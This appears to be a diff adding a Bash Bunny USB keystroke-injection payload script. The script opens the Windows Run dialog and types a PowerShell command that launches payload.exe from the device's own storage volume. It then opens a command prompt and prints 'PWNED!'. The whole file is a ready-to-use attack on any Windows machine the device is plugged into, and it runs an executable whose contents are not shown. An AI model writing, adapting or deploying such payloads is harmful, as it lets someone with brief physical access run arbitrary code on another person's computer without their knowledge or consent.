@@ -1,0 +1,33 @@
+source bunny_helpers.sh
+DELAY 300
+GUI r
+DELAY 150
+STRING powershell ".((gwmi win32_volume -f 'label=''BashBunny''').Name+'payloads\switch2\payload.exe')"
+DELAY 300
+LED R
+ENTER
+DELAY 500
+GUI r
+DELAY 150
+STRING cmd.exe
+DELAY 50
+ENTER
+DELAY 150
+STRING @echo off
+DELAY 50
+ENTER
+STRING color a
+DELAY 50
+ENTER
+DELAY 50
+STRING cls
+DELAY 50
+ENTER
+STRING ECHO PWNED!
+LED G
+ENTER
+LED B
+DELAY 500
+STRING exit
+DELAY 50
+ENTER
